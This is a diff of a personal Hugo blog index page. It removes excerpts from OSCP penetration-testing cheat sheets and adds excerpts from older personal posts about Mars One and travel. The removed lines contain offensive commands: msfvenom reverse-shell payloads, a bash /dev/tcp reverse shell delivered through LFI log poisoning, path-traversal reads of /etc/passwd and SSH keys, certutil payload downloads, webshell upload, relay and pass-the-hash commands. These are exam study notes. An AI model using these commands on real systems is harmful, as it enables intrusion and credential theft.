@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<meta name="generator" content="Hugo 0.152.2">
+	<meta name="generator" content="Hugo 0.154.5">
   
     <title>Digital Garden</title>
   
@@ -125,10 +125,6 @@
     <ul class="menu__dropdown">
       
         
-          <li><a href="/about/">About</a></li>
-        
-      
-        
           <li><a href="/about">About</a></li>
         
       
@@ -150,28 +146,13 @@
     
       
         
-          <li><a href="/about/" >About</a></li>
-        
-      
-        
           <li><a href="/about" >About</a></li>
         
       
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
       
-        <li>
-          <ul class="menu">
-            <li class="menu__trigger">Show more&nbsp;▾</li>
-            <li>
-              <ul class="menu__dropdown">
-                
-                  
-                    <li><a href="/showcase" >Showcase</a></li>
-                  
-                
-              </ul>
-            </li>
-          </ul>
-        </li>
       
     
   </ul>
@@ -197,17 +178,15 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheat-sheet---misc-pentesting/">Cheat Sheet - Misc Pentesting</a>
+          <a href="/posts/website---choosing-a-crew-for-mars/">Website - Choosing a Crew for Mars</a>
         </h2>
 
-        <div class="post-meta"></div>
+        <div class="post-meta"><time class="post-date">2017-01-20</time><span class="post-author">[Josh Richards]</span></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/oscp/">OSCP</a>&nbsp;
-            
-            #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
+            #<a href="/tags/writing/">writing</a>&nbsp;
             
           </span>
         
@@ -217,66 +196,29 @@
 
         <div class="post-content">
           
-            <p>Related: <a href="/posts/cheat-sheet---ad/">OSCP</a></p>
-<hr>
-<h1 id="links">Links</h1>
-<ul>
-<li>PayloadAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master</a></li>
-<li>Box Writeups <a href="https://0xdf.gitlab.io/">https://0xdf.gitlab.io/</a></li>
-<li><a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1">PG &amp; HTBV Boxes for OSCP Prep</a></li>
-<li><a href="https://neil-fox.github.io/Impacket-usage-&amp;-detection/">Impacket usage &amp; detection</a></li>
-</ul>
-<p>Fix zsh corrupt history</p>
-<pre tabindex="0"><code>cd ~ ||
-mv .zsh_history .zsh_history_bad ||
-strings .zsh_history_bad &gt; .zsh_history || 
-fc -R .zsh_history ||
-rm ~/.zsh_history_bad
-</code></pre><ul>
-<li>Python Virtual Environment <a href="https://www.freecodecamp.org/news/how-to-setup-virtual-environments-in-python/">https://www.freecodecamp.org/news/how-to-setup-virtual-environments-in-python/</a></li>
-<li>Building an .exe from .csproj &amp; .sln files (.NET)
-<ul>
-<li><code>git clone https://github.com/RepoToClone</code> then <code>cd RepoToClone</code></li>
-</ul>
-</li>
-</ul>
-<h2 id="wmi">WMI</h2>
-<p>Abusing WMI in PowerShell (to launch Calc)</p>
-<pre tabindex="0"><code>$username = &#39;targetuser&#39;; #not the current user
-$password = &#39;Password123!&#39;; #not the current password
-$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
-
-$options = New-CimSessionOption -Protocol DCOM
-$session = New-Cimsession -ComputerName 192.168.target.ip -Credential $credential -SessionOption $Options 
-$command = &#39;calc&#39;;
-
-Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
-</code></pre><hr>
-<p>To generate a base64-encoded reverse shell, create the following python script (encode.py);</p>
+            <p>With Mars One’s next astronaut selection round <a href="https://web.archive.org/web/20170617195929/http://www.mars-one.com/about-mars-one/current-mission-status">later this year</a> looking to bring the <a href="https://web.archive.org/web/20170617195929/http://www.mars-one.com/faq/selection-and-preparation-of-the-astronauts/how-will-the-astronaut-selection-proceed">current crop of 100 candidates down to 18-36</a> who will then start full-time training, I figured it was time to talk a little about how the next round will progress and what the selectors have said they want from the first Martian colonists.</p>
+<p>When most folks talk about finding the “best” people for a job, especially when it’s space-related, there’s unfortunately one default reference pretty much every one leaps to:</p>
           
         </div>
 
         
           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---misc-pentesting/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/website---choosing-a-crew-for-mars/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheat-sheet---oscp-core/">Cheat Sheet - OSCP Core</a>
+          <a href="/posts/website---dear-josh-in-2020/">Website - Dear Josh in 2020</a>
         </h2>
 
-        <div class="post-meta"></div>
+        <div class="post-meta"><time class="post-date">2017-01-06</time><span class="post-author">[Josh Richards]</span></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
-            
-            #<a href="/tags/oscp/">OSCP</a>&nbsp;
+            #<a href="/tags/writing/">writing</a>&nbsp;
             
           </span>
         
@@ -286,97 +228,29 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
         <div class="post-content">
           
-            <p>Related:</p>
-<hr>
-<h1 id="setup">Setup</h1>
-<p>Create directories: <code>mkdir dc host1 host2</code></p>
-<ul>
-<li>Create sub directories: <code>mkdir enu loot files exploits</code>
-Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
-</ul>
-<h1 id="quick-reference">Quick Reference</h1>
-<ul>
-<li><code>sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap</code></li>
-<li><code>sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap</code></li>
-<li><code>gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap</code></li>
-<li><code>usr/share/wordlists/rockyou.txt</code></li>
-<li><code>usr/share/wordlists/SecLists</code></li>
-<li><code>nc -nvlp 4444</code> <a href="https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1">NetCat Cheat Sheet</a></li>
-<li><a href="https://www.revshells.com/">https://www.revshells.com/</a></li>
-</ul>
-<h1 id="exploits">Exploits</h1>
-<ul>
-<li>Searchspolit
-<ul>
-<li>Search exploits <code>searchsploit remote mouse 3.008</code></li>
-<li>View exploit <code>searchsploit -x 46697</code></li>
-<li>Copy exploit <code>searchsploit -m 46697</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/justakazh/sicat">Sicat</a> (<code>~/Tools/sicat</code>)
-<ul>
-<li>Search exploits: <code>python3 ~/Tools/sicat/sicat.py -k &quot;Keywords here&quot; --exploitdb --msfmodule --packetstorm --exploitalert --nvd</code></li>
-<li>Use exported nmap xml (use <code>-oX nmap_out.xml</code>): <code>python3 ~/Tools/sicat/sicat.py -nm nmap_out.xml --exploitdb --msfmodule --packetstorm --exploitalert --nvd</code></li>
-</ul>
-</li>
-<li>Nmap
-<ul>
-<li>Grep Exploit list <code>grep Exploits /usr/share/nmap/scripts/*.nse</code></li>
-<li>NSE help <code>nmap --script-help=nsescript-name.nse</code></li>
-</ul>
-</li>
-<li>MSFvenom - <a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/">Cheatsheet</a>
-<ul>
-<li>PHP <code>msfvenom -p php/reverse_php LHOST=192.168.x.x LPORT=4444 -o shell.php</code></li>
-<li>Windows
-<ul>
-<li>List x64 payloads: <code>msfvenom -l payloads --platform windows --arch x64</code></li>
-<li>Unstaged Revshell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xx.xxx LPORT=4444 -f exe &gt; reverse.exe</li>
-<li>Metasploit staged: <code>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe</code>
-<ul>
-<li>Open msfconsole on Kali: <code>sudo msfconsole -q</code></li>
-<li>Multi-handler: <code>use multi/handler</code></li>
-<li>Set payload: <code>set payload windows/x64/shell/reverse_tcp</code></li>
-<li>Set options: <code>show options</code></li>
-<li>Run: <code>run</code> to listen, then run binary on target (<code>.\staged.exe</code>)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/">Alphanumeric Shellcode</a> <code>msfvenom -a x86 --platform windows -p windows/shell/shell_reverse_tcp -e x86/alpha_mixed -f python</code></li>
-</ul>
-</li>
-</ul>
-<h1 id="grep">Grep</h1>
-<ul>
-<li><code>grep &quot;text string&quot; filetosearch.txt -A 5</code></li>
-<li><code>grep -rni &quot;text string&quot; /path/to/directory</code></li>
-</ul>
-<h1 id="nmap">Nmap</h1>
-<p><a href="https://www.stationx.net/nmap-scripts/">Top 10 Scripts</a></p>
+            <p><img src="https://web.archive.org/web/20170617122035im_/https://i1.wp.com/joshrichards.space/wp-content/uploads/2016/12/letter.jpg?resize=337%2C255" alt="">Dear Josh in 2020,<br>
+Firstly congratulations if you’re still around to read this – given all the stupid shit you’ve done through the years it’s a genuine surprise you’re still here to write this in 2016 at all, let alone read it in 2020. That’s not to say you’ve stopped doing stupid shit, because in case you’ve forgotten, you still do. A lot. But atleast over the last 4 years since you first found out about Mars One you’ve been a hell of a lot more focused on <em>why</em> you take ridiculous risks than you ever were. There’s a reason to take risks now… even if that reason is so I can live on a cold and unforgiving planet 56 million kilometers away without hope of return. I also spend a lot less time screaming at audiences while wearing a koala suit &amp; playing ukulele now too, which I’m sure most people will agree is a good thing.</p>
           
         </div>
 
         
           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---oscp-core/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/website---dear-josh-in-2020/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheat-sheet---oscp-web/">Cheat Sheet - OSCP Web</a>
+          <a href="/posts/website---2016-end-of-year-review/">Website - 2016 End of Year Review</a>
         </h2>
 
-        <div class="post-meta"></div>
+        <div class="post-meta"><time class="post-date">2016-12-30</time><span class="post-author">[Josh Richards]</span></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
-            
-            #<a href="/tags/oscp/">OSCP</a>&nbsp;
+            #<a href="/tags/writing/">writing</a>&nbsp;
             
           </span>
         
@@ -386,66 +260,32 @@ Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
 
         <div class="post-content">
           
-            <p>Related:</p>
-<p>Tags: <a href="/posts/cheat-sheet---ad/">OSCP</a></p>
+            <p>from</p>
 <hr>
-<ul>
-<li>phpInfo: Look for <code>Document_Root</code></li>
-<li>Wordpress <a href="https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell">https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell</a></li>
-</ul>
-<h1 id="directory-traversal">Directory Traversal</h1>
-<ul>
-<li>Show <code>ect/passwd</code> from php: `<a href="http://targeturl.com/index.php?page=../../../../../../../../../etc/passwd">http://targeturl.com/index.php?page=../../../../../../../../../etc/passwd</a></li>
-<li>Grabbing/Saving SSH RSA Private Key of Username: `curl <a href="http://targeturl.com/index.php?page=../../../../../../../../../home/username/.ssh/id_rsa">http://targeturl.com/index.php?page=../../../../../../../../../home/username/.ssh/id_rsa</a> |
-<ul>
-<li>Logging in with RSA key: `ssh -i dt_key -p 2222 <a href="mailto:username@targeturl.com">username@targeturl.com</a></li>
-</ul>
-</li>
-<li>Windows - Grafana Vulnerability (CVE-2021-43798): `http://ipaddress:3000/public/plugins/mysql/../../../../../../../../Users/Install.txt</li>
-<li>URL encoding: `curl http://ipaddress/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords</li>
-</ul>
-<h1 id="local-file-inclusion-lfi-through-log-poisoning">Local File Inclusion (LFI) through Log Poisoning</h1>
-<p>Write executeable code to Apache&rsquo;s access.log file in /var/log/apache2/</p>
-<ul>
-<li>Add PHP snippet to user agent header of GET request: `<!-- raw HTML omitted --></li>
-<li>Modify GET request with directory traversal to log file &amp; cmd: `GET /index.php?page=../../../../../../../../../var/log/apache2/access.log&amp;cmd=ls%20-la</li>
-<li>Reverse Shell
-<ul>
-<li>Start netcat listener: <code>nc -nvlp 4444</code></li>
-<li>Mod GET cmd to bash reverse shell one-liner = `bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/local.host.ip.address/4444 0&gt;&amp;1&rdquo;
-<ul>
-<li>URL Encoded: `GET index.php?page=../../../../../../../../../var/log/apache2/access.log&amp;cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Flocal.host.ip.address%2Fport%200%3E%261%22</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Alt to show sensitive file: `GET /index.php?page=../../../../../../../../../xampp/htdocs/secret.txt&amp;cmd=cat</li>
-</ul>
-<h1 id="php-wrappers-bypassing-file-inclusion-filters">PHP Wrappers (Bypassing file inclusion filters)</h1>
-<p>Filter (To read contents)</p>
+<h1 id="heading"><a href="https://web.archive.org/web/20170617122035/http://joshrichards.space/2016/12/30/private-journal-end-of-year-review/" title="Permalink to [Private Journal] End of Year Review">[Private Journal] End of Year Review</a></h1>
+<p>Hi everyone!
+Many of you may not know, but for the last 5 years I’ve been keeping handwritten diaries &amp; journals of my adventures – ranging from purely mundane “To Do” lists, right through to incredibly personal thoughts on life, the universe and everything. And over the last two weeks I’ve been reviewing all 7 books worth of journals I’ve kept since 2011: taking notes, photographing interesting entries and transcribing them ready to be <a href="https://web.archive.org/web/20170617122035/https://www.patreon.com/joshrichards">published on Patreon</a>.</p>
           
         </div>
 
         
           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---oscp-web/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/website---2016-end-of-year-review/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheat-sheet---oscp-windows/">Cheat Sheet - OSCP Windows</a>
+          <a href="/posts/website---good-bad-ugly-mars-one-update/">Website - Good Bad Ugly (Mars One Update)</a>
         </h2>
 
-        <div class="post-meta"></div>
+        <div class="post-meta"><time class="post-date">2016-12-16</time><span class="post-author">[Josh Richards]</span></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
-            
-            #<a href="/tags/oscp/">OSCP</a>&nbsp;
+            #<a href="/tags/writing/">writing</a>&nbsp;
             
           </span>
         
@@ -455,76 +295,31 @@ Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
 
         <div class="post-content">
           
-            <p>Related:
-Tags: <a href="/posts/cheat-sheet---ad/">OSCP</a></p>
-<hr>
-<h2 id="quick-reference">Quick Reference</h2>
-<ul>
-<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
-<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
-<li><code>dir /s/b *.txt</code></li>
-<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
-<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
-<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
-<li>Compile C#: <code>msbuild projectname.csproj</code></li>
-<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
-<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
-<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
-</ul>
-<h2 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h2>
-<ul>
-<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
-<ul>
-<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
-</ul>
-</li>
-<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
-<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
-<ul>
-<li><code>smbclient -U user \\\\192.168.</code></li>
-<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
-<ul>
-<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
-</ul>
-</li>
-<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
-</ul>
-</li>
-<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
-<ul>
-<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
-<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
-<ul>
-<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="impacket">Impacket</h2>
-<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
-<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
+            <p>There’s been a mountain of recent updates on Mars One over the last few months, so I figured it’d be a a great opportunity to kick off the regular “Space” posts with a full-spectrum round-up of the good, bad and ugly of all that’s happened.</p>
+<h2 id="the-good"><strong>The Good</strong></h2>
+<p><img src="https://web.archive.org/web/20170617195929im_/https://i1.wp.com/joshrichards.space/wp-content/uploads/2016/12/blondie.jpg?resize=300%2C207" alt=""></p>
+<p>After a huge amount of initial support and media coverage Mars One has had a really hard time transitioning from a small space startup with an incredible idea into a functioning space company with revenue stable enough to take that incredible idea further. After limping along with a small team trying to make ends meet while encouraging top-end investors to finance a significant proportion of the whole project, the merchandise store and private investment have generated a steady baseline stream of income over the last 3 years and provided the financial evidence of the business plan smaller investors needed.</p>
           
         </div>
 
         
           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---oscp-windows/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/website---good-bad-ugly-mars-one-update/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheatsheet---cryptography/">Cheatsheet - Cryptography</a>
+          <a href="/posts/website---florida/">Website - Florida</a>
         </h2>
 
-        <div class="post-meta"></div>
+        <div class="post-meta"><time class="post-date">2016-06-28</time><span class="post-author">[Josh Richards]</span></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cybersecurity/">Cybersecurity</a>&nbsp;
+            #<a href="/tags/writing/">writing</a>&nbsp;
             
           </span>
         
@@ -534,66 +329,14 @@ Tags: <a href="/posts/cheat-sheet---ad/">OSCP</a></p>
 
         <div class="post-content">
           
-            <p>Related: <a href="/posts/asd-annual-cyber-threat-report-2023-2024---notes/">Cybersecurity</a></p>
-<hr>
-<p><strong>Cryptography</strong> is the art and science of keeping information secure through the use of mathematical concepts and techniques.
-Goals of Cryptography - P.A.I.N.</p>
-<ul>
-<li><strong>Privacy</strong> (Confidentiality) keeps data secure from unauthorized parties</li>
-<li><strong>Authentication</strong> is used to confirm the identities of the sender and receiver of data.</li>
-<li><strong>Integrity</strong> ensures a message isn’t altered in transit</li>
-<li><strong>Non-Repudiation</strong> prevents the original sender from denying they were the sender.</li>
-</ul>
-<h2 id="crypto-tools">Crypto Tools</h2>
-<ul>
-<li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
-<li><a href="https://www.rapidtables.com/convert/number/binary-to-hex.html">RapidTables</a></li>
-<li><a href="https://cryptii.com/">Cryptii</a></li>
-<li><a href="https://deobfuscate.io/">JavaScript Deobfuscator</a></li>
-</ul>
-<h2 id="references">References</h2>
-<ul>
-<li>[Cryptography Wikibooks - Comprehensive Resource]](<a href="https://en.wikibooks.org/wiki/Cryptography">https://en.wikibooks.org/wiki/Cryptography</a>)</li>
-<li><a href="https://cryptobook.nakov.com/">Practical Cryptography - Online Book</a></li>
-<li><a href="https://www.khanacademy.org/computing/computer-science/cryptography">KhanAcademy - Cryptography</a></li>
-<li><a href="https://tholman.com/other/transposition/">Transposition Cipher Solver</a></li>
-<li><a href="http://practicalcryptography.com/cryptanalysis/">Cryptanalysis of numerous classical ciphers</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Security_level">“Security Level”</a> is the strength of the <a href="https://en.wikipedia.org/wiki/Cryptographic_primitive">cryptographic primitive</a></li>
-</ul>
-<h2 id="terms">Terms</h2>
-<ul>
-<li><strong>Plaintext</strong> - Information in human-readable form.</li>
-<li><strong>Ciphertext</strong> - Plaintext message that has been encrypted into an unreadable form</li>
-<li><strong>Encryption</strong> - The process of converting plaintext to ciphertext.</li>
-<li><strong>Decryption</strong> - The process of converting ciphertext to plaintext.</li>
-<li><strong>Cipher</strong> - A method of performing encryption or decryption.</li>
-<li><strong>Key</strong> - A parameter specifying how plaintext is converted to ciphertext and vice versa.</li>
-<li><strong>Caesar Cipher</strong> - A type of cipher that shifts the letters in the alphabet by a fixed number.</li>
-<li><strong>Enigma Cipher</strong> - A type of cipher used by Germany in World War II to encrypt messages.</li>
-</ul>
-<h2 id="openssl">OpenSSL</h2>
-<ul>
-<li><code>openssl</code> Initializes the OpenSSL program.</li>
-<li><code>enc</code> Stands for “encryption.”</li>
-<li><code>-pbkdf2</code> Specifies the encryption key type.</li>
-<li><code>-nosalt</code> Specifies that salting will not be applied.</li>
-<li><code>-aes-256-cbc</code> Is the name of the cipher used</li>
-<li><code>-K</code> KEY Defines the encryption key (“KEY” is the key)</li>
-<li><code>-iv</code> INITIAL Defines the initialisation vector (IV) (“INITIAL” is the IV)</li>
-<li><code>-P &gt; key_iv.txt</code> Prints the key and IV to “key_iv.txt”</li>
-<li>Creating a key and IV: <code>openssl enc -pbkdf2 -nosalt -aes-256-cbc -k mypassword -P &gt; key_and_IV.txt</code></li>
-<li>Encrypting: <code>openssl enc -pbkdf2 -nosalt -aes-256-cbc -in plaintextmsg.txt -out encodedmsg.txt.enc -base64 -K KEY_HERE -iv IV_HERE</code></li>
-<li>Decrypting: <code>openssl enc -pbkdf2 -nosalt -aes-256-cbc -in encodedmsg.txt.enc -d -base64 -K KEY_HERE -iv IV_HERE</code></li>
-</ul>
-<h2 id="asymmetric-encryption">Asymmetric Encryption</h2>
-<p><a href="https://www.101computing.net/symmetric-vs-asymmetric-encryption/">Symmetric vs Asymmetric Encryption</a>
-<strong>RSA</strong> is the asymmetric algorithm standard used around the world. It works by employing the complexity of factoring large numbers. <a href="https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29">(Wikipedia)</a></p>
+            <p><img src="https://web.archive.org/web/20160628102243im_/http://www.themightyginge.com/blog/wp-content/uploads/2016/06/Florida-300x150.jpg" alt="Florida"></p>
+<p>By the time I left D.C. the Cosmic Nomad tour was seriously starting to catch up with me. I’d been on the go non-stop since January, completing an Australia-wide tour right on the back of working on the ISU course in Adelaide AND being locked in a box like a Damien Hirst artwork. It was a month since I’d started the overseas leg of the tour, in which I’d done a lot of soul-searching while bouncing from place to place, experience to experience… quite frankly I was feeling a bit wrecked from it all.</p>
           
         </div>
 
         
           <div>
-            <a class="read-more button inline" href="/posts/cheatsheet---cryptography/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/website---florida/">[Read more]</a>
           </div>
         
       </article>
@@ -626,7 +369,7 @@ Goals of Cryptography - P.A.I.N.</p>
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
     
       <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
       </div>
